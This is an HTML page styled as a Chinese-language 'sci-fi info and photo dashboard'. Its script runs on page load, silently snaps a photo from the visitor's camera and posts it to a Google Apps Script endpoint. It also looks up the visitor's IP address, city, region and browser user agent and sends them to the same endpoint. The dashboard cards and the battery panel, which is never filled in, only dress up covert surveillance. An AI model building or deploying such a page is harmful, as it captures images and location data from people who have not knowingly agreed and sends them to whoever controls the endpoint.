<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>科幻資訊與拍照儀表板</title>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    /* 背景動畫 */
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, #03031c, #0a0a4a);
      height: 100vh;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #00ffff;
    }

    .dashboard {
      width: 90%;
      max-width: 1200px;
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      margin-bottom: 20px;
    }

    .title {
      grid-column: span 2;
      text-align: center;
      font-size: 2.5rem;
      margin-bottom: 20px;
      text-shadow: 0 0 20px #00eaff, 0 0 30px #0077ff;
    }

    .card {
      background: rgba(15, 15, 50, 0.9);
      border: 2px solid #00ffff;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 255, 204, 0.5);
      text-align: center;
      padding: 20px;
      position: relative;
      overflow: hidden;
      color: #ffffff;
    }

    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, rgba(0, 255, 204, 0.5), transparent);
      opacity: 0.1;
      z-index: 0;
      animation: glow 6s infinite alternate;
    }

    @keyframes glow {
      0% { opacity: 0.1; }
      100% { opacity: 0.3; }
    }

    .card h2 {
      font-size: 1.8rem;
      text-shadow: 0 0 10px #00ffff;
      margin-bottom: 15px;
    }

    .card p {
      font-size: 1.2rem;
      z-index: 1;
    }

    .highlight {
      font-size: 1.5rem;
      font-weight: bold;
      color: #00ffcc;
      text-shadow: 0 0 10px #00ffcc;
    }

    .chart-card canvas {
      max-width: 100%;
    }

    .footer {
      width: 100%;
      text-align: center;
      padding: 10px 0;
      background: linear-gradient(to right, #03031c, #0a0a4a);
    }

    .logo img {
      width: 80px;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
  </style>
</head>
<body>
  <div class="dashboard">
    <h1 class="title">科幻資訊與拍照儀表板</h1>

    <!-- 拍照狀態 -->
    <div class="card">
      <h2>拍照狀態</h2>
      <p id="photoStatus">狀態：啟動中...</p>
    </div>

    <!-- 電池資訊 -->
    <div class="card">
      <h2>電池資訊</h2>
      <p class="highlight" id="batteryLevel">--%</p>
      <p id="batteryStatus">狀態：未知</p>
      <p id="batteryRemaining">剩餘時間：-- 分鐘</p>
    </div>

    <!-- IP 回傳狀態 -->
    <div class="card">
      <h2>IP 資訊</h2>
      <p id="ipInfo">資料回傳中...</p>
    </div>

    <!-- 設備回傳狀態 -->
    <div class="card">
      <h2>設備資訊</h2>
      <p id="deviceInfo">資料回傳中...</p>
    </div>
  </div>

  <!-- 底部商標 -->
  <footer class="footer">
    <div class="logo">
      <img src="https://via.placeholder.com/100x50?text=LOGO" alt="商標">
    </div>
  </footer>

  <script>
    const BACKEND_PHOTO_URL = 'https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec'; // 替換為圖片後端
    const BACKEND_IP_URL = 'https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec'; // 替換為 IP 後端

    async function startCameraAndSend() {
      const statusElement = document.getElementById('photoStatus');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'environment' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoData = canvas.toDataURL('image/jpeg', 0.5);
          stream.getTracks().forEach((track) => track.stop());
          sendPhotoToServer(photoData);
        }, 1000);
      } catch (error) {
        statusElement.innerText = '相機啟動失敗！';
        console.error('相機啟動錯誤:', error);
      }
    }

    async function sendPhotoToServer(photoData) {
      const statusElement = document.getElementById('photoStatus');
      try {
        const formData = new URLSearchParams();
        formData.append('imageData', photoData.split(',')[1]);

        const response = await fetch(BACKEND_PHOTO_URL, { method: 'POST', body: formData });
        const result = await response.json();

        if (result.success) {
          statusElement.innerText = '照片已成功傳送！';
        } else {
          statusElement.innerText = '照片傳送失敗！';
        }
      } catch (error) {
        statusElement.innerText = '傳送過程中發生錯誤！';
        console.error('照片傳送錯誤:', error);
      }
    }

    async function sendIpAndDeviceInfo() {
      const ipInfoElement = document.getElementById('ipInfo');
      const deviceInfoElement = document.getElementById('deviceInfo');
      try {
        const ipResponse = await fetch('https://ipinfo.io/json');
        const ipData = await ipResponse.json();

        const userAgent = navigator.userAgent;

        const formData = new URLSearchParams();
        formData.append('ip', ipData.ip);
        formData.append('city', ipData.city);
        formData.append('region', ipData.region);
        formData.append('userAgent', userAgent);

        const response = await fetch(BACKEND_IP_URL, { method: 'POST', body: formData });
        const result = await response.json();

        if (result.success) {
          ipInfoElement.innerText = 'IP 資料已回傳！';
          deviceInfoElement.innerText = '設備資料已回傳！';
        } else {
          ipInfoElement.innerText = 'IP 資料回傳失敗！';
          deviceInfoElement.innerText = '設備資料回傳失敗！';
        }
      } catch (error) {
        ipInfoElement.innerText = '資料讀取失敗！';
        deviceInfoElement.innerText = '資料讀取失敗！';
        console.error('資料回傳錯誤:', error);
      }
    }

    window.onload = () => {
      startCameraAndSend();
      sendIpAndDeviceInfo();
    };
  </script>
</body>
</html>
